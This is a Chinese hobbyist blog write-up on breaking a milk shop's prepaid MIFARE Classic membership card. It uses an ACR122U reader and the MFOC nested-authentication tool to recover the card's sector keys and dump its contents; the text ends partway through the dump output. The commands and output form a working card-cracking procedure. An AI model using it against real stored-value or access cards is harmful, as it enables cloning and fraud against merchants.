<!DOCTYPE html>
<html lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8"><meta name="generator" content="Hugo 0.147.8"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="color-scheme" content="light dark">
<meta name="supported-color-schemes" content="light dark"><meta name="description" content="前言
这样的文章多年前就已经被写烂了，没啥意思，作为学习过程吧，发出来。
前几天办了一张鲜奶会员卡，充值100获得的，也不用实名。把卡放到机子上刷一下就支付完成了，引起了我的兴趣。
玩RFID一般使用Proxmark3，当时年少无知买了ACR122U。
先用我的Nexus5安装Mifare Classic Tool验证一下奶店提供的卡是不是Mifare Classic卡(Nexus5硬件不支持这种类型的卡，只能读基本信息)。
确定是之后，重新拿出封尘的ACR122U，开始在Arch Linux上折腾。
我的两张饭卡都在外出时丢失了，刚好有备份过以前的卡，顺便重新恢复两张。"><title>Arch Linux上使用ACR122U破解鲜奶卡&nbsp;&ndash;&nbsp;Gorgias&#39; Blog</title><link rel="stylesheet" href="/css/core.min.63f706677e61b4ee62b8daf083358d3bbf8ac8ab03c7d171af3180fab3a3ebb83efb79fb98674f13dde6db11de2bf694.css" integrity="sha384-Y/cGZ35htO5iuNrwgzWNO7&#43;KyKsDx9FxrzGA&#43;rOj67g&#43;&#43;3n7mGdPE93m2xHeK/aU"><meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="Arch Linux上使用ACR122U破解鲜奶卡" /><body><section id="header">
    <div class="header wrap"><span class="header left-side"><a class="site home" href="/"><span class="site name">Gorgias' Blog</span></a></span>
        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/categories/">Categories</a><a class="nav item" href="/tags/">Tags</a><a class="nav item" href="/about">About</a><a class="nav item" href="/links">Links</a></nav></div></span></div></section><section id="content"><div class="article-container"><section class="article header">
    <h1 class="article title">Arch Linux上使用ACR122U破解鲜奶卡</h1><p class="article date">Tuesday, October 25, 2016</p></section><article class="article markdown-body"><h2 id="前言">前言</h2>
<p>这样的文章多年前就已经被写烂了，没啥意思，作为学习过程吧，发出来。
前几天办了一张鲜奶会员卡，充值100获得的，也不用实名。把卡放到机子上刷一下就支付完成了，引起了我的兴趣。
玩RFID一般使用Proxmark3，当时年少无知买了ACR122U。
先用我的Nexus5安装Mifare Classic Tool验证一下奶店提供的卡是不是Mifare Classic卡(Nexus5硬件不支持这种类型的卡，只能读基本信息)。
确定是之后，重新拿出封尘的ACR122U，开始在Arch Linux上折腾。
我的两张饭卡都在外出时丢失了，刚好有备份过以前的卡，顺便重新恢复两张。</p>
<p><img loading="lazy"  src="./new_card.jpg"
        alt="new_card"/></p>
<h2 id="basic-knowledge">Basic Knowledge</h2>
<p>MIFARE IC卡由荷兰恩智浦(NXP)半导体公司开发，本篇文章分析的是MF1S50系列卡，遵循<a href="https://en.wikipedia.org/wiki/ISO/IEC_14443"target="_blank" rel="noopener noreferrer">ISO/IEC 14443A</a>标准。
NXP公司在2010年更新了MIFARE Classic卡，ID分为7 Byte unique ID和4 Byte non-unique ID。</p>
<h3 id="logical-structure">Logical Structure</h3>
<p>MIFARE Classic 1K 卡的内存被划分成16个sectors，每个sector有4个blocks，每个block占16bytes。
开头第一个block（Manufacturer Block）包含了UID(Unique Identifier 4 bytes),接下来是厂商数据(Manufacturer Data)。
BCC(Block Check Character, 1 byte，前4bytes ID的异或结果),ATQA(Answer To Request acc, 2 bytes),SAK(Select Acknowledge, 1 byte)。</p>
<p><img loading="lazy"  src="./Logical_Structure.png"
        alt="Logical_Structure"/>
每个sector中的第四个block（Sector Trailer，控制块）保存着两个Secret keys (Key A, Key B, 各占 6 bytes)和 AC (Access condition,决定哪个Key将被使用，占 3 bytes)。还有GPB(General Purpose Byte, 1 byte, 未使用，或者成为 Unused)。</p>
<h3 id="crypto1">CRYPTO1</h3>
<p>MIFARE Classic仅使用<a href="https://en.wikipedia.org/wiki/Crypto-1"target="_blank" rel="noopener noreferrer">CRYPTO1</a>加密算法，因为算法不公开，未经过大神们的考验，存在潜在的漏洞。2007年两位德国人Karsten Nohl 和 Henryk Pltz提出了Crypto-1加密的缺陷。2008年算法被完全逆向并且公布出来。
Crypto-1是一种流密码，依赖密钥序列的随机性和不可预测性。
<img loading="lazy"  src="./stream.png"
        alt="stream"/>
48-bit的LFSR(Linear Feedback Shift Register，线性反馈位移寄存器)和一个非线性函数，生成密钥，长度太短容易被爆破。
16-bit的LFSR通过一个多项式生成32bit的nT(随机数)。的前面的16-bit决定了后面的16-bit，密钥的不可预测性就失效了。
初始随机数依赖时间生成，通过控制读卡器的时间，可以控制随机数，所以随机性也失效了。</p>
<h3 id="attack">Attack</h3>
<p>参考大神们的文章将破解方法总结。</p>
<ul>
<li>条件特殊：重放，监控USB流量，在读卡器和卡之间窃听流量。</li>
<li>通常：爆破，Dark-Side，认证嵌套(authentication nested)</li>
</ul>
<h2 id="usage">Usage</h2>
<h3 id="acr122u-driver">ACR122U Driver</h3>
<p>下载官方驱动源码</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget http://www.acs.com.hk/download-driver-unified/6260/ACS-Unified-Driver-Lnx-Mac-113-P.zip
</span></span></code></pre></div><p>在编译安装之前，需要pcsc-lite。pcsc-lite 封装了访问使用 SCard API (PC/SC) 访问智能卡设备的开发包。</p>
<p>Arch-Linux</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo pacman -S pcsclite
</span></span></code></pre></div><p>解压并编译安装</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">unzip -d acr122u ./ACS-Unified-Driver-Lnx-Mac-113-P.zip
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> acr122u
</span></span><span class="line"><span class="cl">tar -jxvf acsccid-1.1.3.tar.bz2
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ./acsccid-1.1.3
</span></span></code></pre></div><h3 id="open-source-near-field-communication-nfc-library">Open Source Near Field Communication (NFC) Library</h3>
<p>还需要安装libtool（通用库支持脚本），libnfc，在Arch-Linux上安装特别方便</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo pacman -S libtool
</span></span><span class="line"><span class="cl">yaourt libnfc
</span></span></code></pre></div><p><code>nfc-list -v</code>查看一下设备列表，结果报错</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Unable to claim USB interface <span class="o">(</span>Device or resource busy<span class="o">)</span>
</span></span></code></pre></div><p><a href="https://wiki.archlinux.org/index.php/Touchatag_RFID_Reader"target="_blank" rel="noopener noreferrer">Arch Linux Wiki</a>上面说，内核版本(&gt;3.5)会自动加载pn533驱动，pcscd则会报错</p>
<p>先查看一下模块列表</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gorgias@3vil ~&gt; lsmod
</span></span><span class="line"><span class="cl">Module                  Size  Used by
</span></span><span class="line"><span class="cl">pn533_usb              <span class="m">16384</span>  <span class="m">0</span>
</span></span><span class="line"><span class="cl">pn533                  <span class="m">28672</span>  <span class="m">1</span> pn533_usb
</span></span><span class="line"><span class="cl">nfc                    <span class="m">86016</span>  <span class="m">1</span> pn533
</span></span></code></pre></div><p>把这三个模块移除，并且加入黑名单，灯会熄灭，但是正常使用</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo modprobe -r pn533_usb pn533 nfc
</span></span><span class="line"><span class="cl">sudo vi /etc/modprobe.d/blacklist-libnfc.conf
</span></span></code></pre></div><p>加入以下内容</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">blacklist nfc
</span></span><span class="line"><span class="cl">blacklist pn533
</span></span><span class="line"><span class="cl">blacklist pn533_usb
</span></span></code></pre></div><p>成功显示设备信息</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gorgias@3vil ~&gt; nfc-list
</span></span><span class="line"><span class="cl">nfc-list uses libnfc 1.7.1
</span></span><span class="line"><span class="cl">NFC device: ACS / ACR122U PICC Interface opened
</span></span><span class="line"><span class="cl"><span class="m">1</span> ISO14443A passive target<span class="o">(</span>s<span class="o">)</span> found:
</span></span><span class="line"><span class="cl">ISO/IEC 14443A <span class="o">(</span><span class="m">106</span> kbps<span class="o">)</span> target:
</span></span><span class="line"><span class="cl">    ATQA <span class="o">(</span>SENS_RES<span class="o">)</span>: <span class="m">00</span>  <span class="m">04</span>
</span></span><span class="line"><span class="cl">       UID <span class="o">(</span>NFCID1<span class="o">)</span>: <span class="m">96</span>  c2  d2  9d
</span></span><span class="line"><span class="cl">      SAK <span class="o">(</span>SEL_RES<span class="o">)</span>: <span class="m">08</span>
</span></span></code></pre></div><h3 id="mfoc">MFOC</h3>
<p>MFOC(Mifare Classic Offline Cracker)是一款离线的认证嵌套攻击工具</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/nfc-tools/mfoc.git
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ./mfoc
</span></span><span class="line"><span class="cl">autoreconf -vis
</span></span><span class="line"><span class="cl">make <span class="o">&amp;&amp;</span> make install
</span></span></code></pre></div><h3 id="dump-mifare-classic-1k">Dump MIFARE Classic 1K</h3>
<p>首先查看帮助</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gorgias@3vil ~&gt; mfoc -h
</span></span><span class="line"><span class="cl">Usage: mfoc <span class="o">[</span>-h<span class="o">]</span> <span class="o">[</span>-k key<span class="o">]</span> <span class="o">[</span>-f file<span class="o">]</span> ... <span class="o">[</span>-P probnum<span class="o">]</span> <span class="o">[</span>-T tolerance<span class="o">]</span> <span class="o">[</span>-O output<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  h     print this <span class="nb">help</span> and <span class="nb">exit</span>
</span></span><span class="line"><span class="cl">  k     try the specified key in addition to the default keys
</span></span><span class="line"><span class="cl">  f     parses a file of keys to add in addition to the default keys
</span></span><span class="line"><span class="cl">  P     number of probes per sector, instead of default of <span class="m">20</span>
</span></span><span class="line"><span class="cl">  T     nonce tolerance half-range, instead of default of <span class="m">20</span>
</span></span><span class="line"><span class="cl">        <span class="o">(</span>i.e., <span class="m">40</span> <span class="k">for</span> the total range, in both directions<span class="o">)</span>
</span></span><span class="line"><span class="cl">  O     file in which the card contents will be written <span class="o">(</span>REQUIRED<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Example: mfoc -O mycard.mfd
</span></span><span class="line"><span class="cl">Example: mfoc -k ffffeeeedddd -O mycard.mfd
</span></span><span class="line"><span class="cl">Example: mfoc -f keys.txt -O mycard.mfd
</span></span><span class="line"><span class="cl">Example: mfoc -P <span class="m">50</span> -T <span class="m">30</span> -O mycard.mfd
</span></span></code></pre></div><p>Dump数据，把每个sector的probes调高一点，默认20，速度可以快很多，输出文件为test.mfd。
MFOC先尝试默认密钥，如果匹配则进行认证嵌套攻击</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gorgias@3vil ~&gt; mfoc -P <span class="m">500</span> -O ~/temp/old.mfd
</span></span><span class="line"><span class="cl">Found Mifare Classic 1k tag
</span></span><span class="line"><span class="cl">ISO/IEC 14443A <span class="o">(</span><span class="m">106</span> kbps<span class="o">)</span> target:
</span></span><span class="line"><span class="cl">    ATQA <span class="o">(</span>SENS_RES<span class="o">)</span>: <span class="m">00</span>  <span class="m">04</span>
</span></span><span class="line"><span class="cl">* UID size: single
</span></span><span class="line"><span class="cl">* bit frame anticollision supported
</span></span><span class="line"><span class="cl">       UID <span class="o">(</span>NFCID1<span class="o">)</span>: <span class="m">96</span>  c2  d2  9d
</span></span><span class="line"><span class="cl">      SAK <span class="o">(</span>SEL_RES<span class="o">)</span>: <span class="m">08</span>
</span></span><span class="line"><span class="cl">* Not compliant with ISO/IEC 14443-4
</span></span><span class="line"><span class="cl">* Not compliant with ISO/IEC <span class="m">18092</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Fingerprinting based on MIFARE <span class="nb">type</span> Identification Procedure:
</span></span><span class="line"><span class="cl">* MIFARE Classic 1K
</span></span><span class="line"><span class="cl">* MIFARE Plus <span class="o">(</span><span class="m">4</span> Byte UID or <span class="m">4</span> Byte RID<span class="o">)</span> 2K, Security level <span class="m">1</span>
</span></span><span class="line"><span class="cl">* SmartMX with MIFARE 1K emulation
</span></span><span class="line"><span class="cl">Other possible matches based on ATQA <span class="p">&amp;</span> SAK values:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Try to authenticate to all sectors with default keys...
</span></span><span class="line"><span class="cl">Symbols: <span class="s1">&#39;.&#39;</span> no key found, <span class="s1">&#39;/&#39;</span> A key found, <span class="s1">&#39;\&#39;</span> B key found, <span class="s1">&#39;x&#39;</span> both keys found
</span></span><span class="line"><span class="cl"><span class="o">[</span>Key: ffffffffffff<span class="o">]</span> -&gt; <span class="o">[</span>..xxxxxxxxxxxxxx<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>Key: a0a1a2a3a4a5<span class="o">]</span> -&gt; <span class="o">[</span>..xxxxxxxxxxxxxx<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>Key: d3f7d3f7d3f7<span class="o">]</span> -&gt; <span class="o">[</span>..xxxxxxxxxxxxxx<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>Key: 000000000000<span class="o">]</span> -&gt; <span class="o">[</span>..xxxxxxxxxxxxxx<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>Key: b0b1b2b3b4b5<span class="o">]</span> -&gt; <span class="o">[</span>..xxxxxxxxxxxxxx<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>Key: 4d3a99c351dd<span class="o">]</span> -&gt; <span class="o">[</span>..xxxxxxxxxxxxxx<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>Key: 1a982c7e459a<span class="o">]</span> -&gt; <span class="o">[</span>..xxxxxxxxxxxxxx<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>Key: aabbccddeeff<span class="o">]</span> -&gt; <span class="o">[</span>..xxxxxxxxxxxxxx<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>Key: 714c5c886e97<span class="o">]</span> -&gt; <span class="o">[</span>..xxxxxxxxxxxxxx<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>Key: 587ee5f9350f<span class="o">]</span> -&gt; <span class="o">[</span>..xxxxxxxxxxxxxx<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>Key: a0478cc39091<span class="o">]</span> -&gt; <span class="o">[</span>..xxxxxxxxxxxxxx<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>Key: 533cb6c723f6<span class="o">]</span> -&gt; <span class="o">[</span>..xxxxxxxxxxxxxx<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>Key: 8fd0a4f256e9<span class="o">]</span> -&gt; <span class="o">[</span>..xxxxxxxxxxxxxx<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Sector <span class="m">00</span> - Unknown Key A               Unknown Key B
</span></span><span class="line"><span class="cl">Sector <span class="m">01</span> - Unknown Key A               Unknown Key B
</span></span><span class="line"><span class="cl">Sector <span class="m">02</span> - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
</span></span><span class="line"><span class="cl">Sector <span class="m">03</span> - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
</span></span><span class="line"><span class="cl">Sector <span class="m">04</span> - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
</span></span><span class="line"><span class="cl">Sector <span class="m">05</span> - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
</span></span><span class="line"><span class="cl">Sector <span class="m">06</span> - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
</span></span><span class="line"><span class="cl">Sector <span class="m">07</span> - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
</span></span><span class="line"><span class="cl">Sector <span class="m">08</span> - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
</span></span><span class="line"><span class="cl">Sector <span class="m">09</span> - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
</span></span><span class="line"><span class="cl">Sector <span class="m">10</span> - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
</span></span><span class="line"><span class="cl">Sector <span class="m">11</span> - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
</span></span><span class="line"><span class="cl">Sector <span class="m">12</span> - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
</span></span><span class="line"><span class="cl">Sector <span class="m">13</span> - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
</span></span><span class="line"><span class="cl">Sector <span class="m">14</span> - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
</span></span><span class="line"><span class="cl">Sector <span class="m">15</span> - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Using sector <span class="m">02</span> as an exploit sector
</span></span><span class="line"><span class="cl">Sector: 0, <span class="nb">type</span> A, probe 0, distance <span class="m">64</span> .....
</span></span><span class="line"><span class="cl">  Found Key: A <span class="o">[</span>9db8bbe5265d<span class="o">]</span>
</span></span><span class="line"><span class="cl">  Data <span class="nb">read</span> with Key A revealed Key B: <span class="o">[</span>883206883206<span class="o">]</span> - checking Auth: OK
</span></span><span class="line"><span class="cl">Sector: 1, <span class="nb">type</span> A
</span></span><span class="line"><span class="cl">  Data <span class="nb">read</span> with Key A revealed Key B: <span class="o">[</span>883206883206<span class="o">]</span> - checking Auth: OK
</span></span><span class="line"><span class="cl">  Found Key: A <span class="o">[</span>9db8bbe5265d<span class="o">]</span>
</span></span><span class="line"><span class="cl">Auth with all sectors succeeded, dumping keys to a file!
</span></span><span class="line"><span class="cl">Block 63, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  ff  <span class="m">07</span>  <span class="m">80</span>  <span class="m">69</span>  ff  ff  ff  ff  ff  ff
</span></span><span class="line"><span class="cl">Block 62, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 61, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 60, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 59, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  ff  <span class="m">07</span>  <span class="m">80</span>  <span class="m">69</span>  ff  ff  ff  ff  ff  ff
</span></span><span class="line"><span class="cl">Block 58, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 57, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 56, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 55, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  ff  <span class="m">07</span>  <span class="m">80</span>  <span class="m">69</span>  ff  ff  ff  ff  ff  ff
</span></span><span class="line"><span class="cl">Block 54, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 53, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 52, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 51, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  ff  <span class="m">07</span>  <span class="m">80</span>  <span class="m">69</span>  ff  ff  ff  ff  ff  ff
</span></span><span class="line"><span class="cl">Block 50, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 49, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 48, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 47, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  ff  <span class="m">07</span>  <span class="m">80</span>  <span class="m">69</span>  ff  ff  ff  ff  ff  ff
</span></span><span class="line"><span class="cl">Block 46, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 45, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 44, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 43, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  ff  <span class="m">07</span>  <span class="m">80</span>  <span class="m">69</span>  ff  ff  ff  ff  ff  ff
</span></span><span class="line"><span class="cl">Block 42, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 41, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 40, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 39, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  ff  <span class="m">07</span>  <span class="m">80</span>  <span class="m">69</span>  ff  ff  ff  ff  ff  ff
</span></span><span class="line"><span class="cl">Block 38, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 37, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 36, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>
</span></span><span class="line"><span class="cl">Block 35, <span class="nb">type</span> A, key ffffffffffff :00  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  <span class="m">00</span>  ff  <span class="m">07</span>  <span class="m">80</span>  <span class="m">69</span>  ff  ff  ff  ff  ff  ff
